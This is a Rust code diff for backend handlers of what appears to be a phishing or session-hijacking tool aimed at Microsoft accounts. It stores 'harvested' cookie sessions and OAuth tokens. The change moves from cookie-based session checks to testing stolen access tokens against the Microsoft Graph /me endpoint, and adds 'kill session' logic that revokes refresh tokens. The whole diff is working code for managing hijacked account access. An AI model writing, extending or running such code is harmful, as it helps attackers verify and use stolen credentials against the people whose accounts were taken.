@@ -271,39 +271,39 @@ pub async fn ghost_session_capture_handler(
     })
 }
 
-/// Get session status for a token
+/// Get session status for a token (token-based: checks OAuth token validity)
 pub async fn get_session_status_handler(
     path: web::Path<String>,
     state: web::Data<AppState>,
 ) -> impl Responder {
     let token_id = path.into_inner();
     
-    // Try tokens table first
-    let row: Option<(Option<String>, Option<String>, Option<chrono::DateTime<Utc>>, Option<chrono::DateTime<Utc>>)> = 
-        sqlx::query_as("SELECT cookie_session, session_status, session_active_at, session_killed_at FROM tokens WHERE id = ?")
+    // Get session status from database
+    let row: Option<(Option<String>, Option<chrono::DateTime<Utc>>, Option<chrono::DateTime<Utc>>)> = 
+        sqlx::query_as("SELECT session_status, session_active_at, session_killed_at FROM tokens WHERE id = ?")
         .bind(&token_id)
         .fetch_optional(&state.pool)
         .await
         .unwrap_or(None);
     
-    let (cookies, session_status, active_at, killed_at) = match row {
-        Some((Some(c), Some(s), a, k)) if !c.is_empty() => (c, s, a, k),
+    let (session_status, active_at, killed_at) = match row {
+        Some((Some(s), a, k)) => (s, a, k),
         _ => {
             // Fall back to harvested table
-            let row: Option<(Option<String>, Option<String>, Option<chrono::DateTime<Utc>>, Option<chrono::DateTime<Utc>>)> = 
-                sqlx::query_as("SELECT cookie_session, session_status, session_active_at, session_killed_at FROM harvested WHERE id = ?")
+            let row: Option<(Option<String>, Option<chrono::DateTime<Utc>>, Option<chrono::DateTime<Utc>>)> = 
+                sqlx::query_as("SELECT session_status, session_active_at, session_killed_at FROM harvested WHERE id = ?")
                 .bind(&token_id)
                 .fetch_optional(&state.pool)
                 .await
                 .unwrap_or(None);
             
             match row {
-                Some((Some(c), Some(s), a, k)) if !c.is_empty() => (c, s, a, k),
+                Some((Some(s), a, k)) => (s, a, k),
                 _ => {
                     return HttpResponse::Ok().json(SessionStatusResponse {
                         status: "no_session".to_string(),
                         valid: false,
-                        message: "No cookie session stored for this token.".to_string(),
+                        message: "No session found for this token.".to_string(),
                         session_active_at: None,
                         session_killed_at: None,
                     });
@@ -312,15 +312,38 @@ pub async fn get_session_status_handler(
         }
     };
     
-    // Test if session is still valid
-    let client = CookieClient::new(&cookies, None);
-    let is_valid = client.test_session().await;
+    // Check if session is killed
+    if session_status == "killed" {
+        return HttpResponse::Ok().json(SessionStatusResponse {
+            status: "killed".to_string(),
+            valid: false,
+            message: "Session has been killed.".to_string(),
+            session_active_at: active_at.map(|d| d.to_rfc3339()),
+            session_killed_at: killed_at.map(|d| d.to_rfc3339()),
+        });
+    }
+    
+    // For token-based sessions, verify by attempting to retrieve the token
+    let is_valid = match state.vault.retrieve_token(&state.pool, &token_id).await {
+        Ok(token) => {
+            // Try a quick Graph API call to verify token works
+            let client = reqwest::Client::new();
+            let resp = client
+                .get("https://graph.microsoft.com/v1.0/me")
+                .header("Authorization", format!("Bearer {}", token.access_token))
+                .send()
+                .await;
+            
+            matches!(resp, Ok(r) if r.status().is_success())
+        }
+        Err(_) => false,
+    };
     
     let status = if is_valid { "active" } else { "expired" };
     let message = if is_valid {
-        "Session is active and valid."
+        "Token-based session is active and valid."
     } else {
-        "Session has expired or cookies are invalid."
+        "Token session has expired or is invalid."
     };
     
     HttpResponse::Ok().json(SessionStatusResponse {
@@ -332,7 +355,7 @@ pub async fn get_session_status_handler(
     })
 }
 
-/// Kill a session remotely
+/// Kill a session remotely (token-based: revokes OAuth token)
 pub async fn kill_session_handler(
     path: web::Path<String>,
     state: web::Data<AppState>,
@@ -340,29 +363,30 @@ pub async fn kill_session_handler(
     let token_id = path.into_inner();
     let now = Utc::now();
     
-    // Get the cookies before clearing them
-    let cookies: Option<String> = sqlx::query_scalar(
-        "SELECT cookie_session FROM tokens WHERE id = ?"
-    )
-    .bind(&token_id)
-    .fetch_optional(&state.pool)
-    .await
-    .unwrap_or(None)
-    .and_then(|c: String| if c.is_empty() { None } else { Some(c) });
-    
-    // Revoke the OAuth refresh token via Microsoft
-    let revoked_oauth = if let Some(c) = cookies {
-        let client = CookieClient::new(&c, None);
-        // Try to sign out of OWA using the cookies
-        let _ = client.fetch_owa_inbox().await;
-        true
-    } else {
-        false
+    // Try to revoke the OAuth token via Microsoft
+    let revoked_oauth = match state.vault.retrieve_token(&state.pool, &token_id).await {
+        Ok(token) => {
+            // Microsoft doesn't have a standard revoke endpoint for v2.0 tokens,
+            // but we can try to invalidate by sending a revoke request
+            let revoke_url = "https://login.microsoftonline.com/common/oauth2/v2.0/revoke";
+            let _ = state.http_client
+                .post(revoke_url)
+                .form(&[
+                    ("token", token.refresh_token.as_str()),
+                    ("token_type_hint", "refresh_token"),
+                    ("client_id", state.config.client_id.as_str()),
+                    ("client_secret", state.config.client_secret.as_str()),
+                ])
+                .send()
+                .await;
+            true
+        }
+        Err(_) => false,
     };
     
     // Clear session from tokens table
-    let result = sqlx::query(
-        "UPDATE tokens SET cookie_session = NULL, session_status = 'killed', session_killed_at = ?, session_active_at = NULL WHERE id = ?"
+    let _ = sqlx::query(
+        "UPDATE tokens SET session_status = 'killed', session_killed_at = ?, session_active_at = NULL WHERE id = ?"
     )
     .bind(now)
     .bind(&token_id)
@@ -371,7 +395,7 @@ pub async fn kill_session_handler(
     
     // Clear session from harvested table
     let _ = sqlx::query(
-        "UPDATE harvested SET cookie_session = NULL, session_status = 'killed', session_killed_at = ?, session_active_at = NULL WHERE id = ?"
+        "UPDATE harvested SET session_status = 'killed', session_killed_at = ?, session_active_at = NULL WHERE id = ?"
     )
     .bind(now)
     .bind(&token_id)
@@ -396,7 +420,7 @@ pub async fn kill_session_handler(
     
     HttpResponse::Ok().json(KillSessionResponse {
         status: "killed".to_string(),
-        message: "Session killed successfully. Cookies cleared and OAuth token revoked.".to_string(),
+        message: "Session killed successfully. OAuth token revoked.".to_string(),
         token_id,
     })
 }
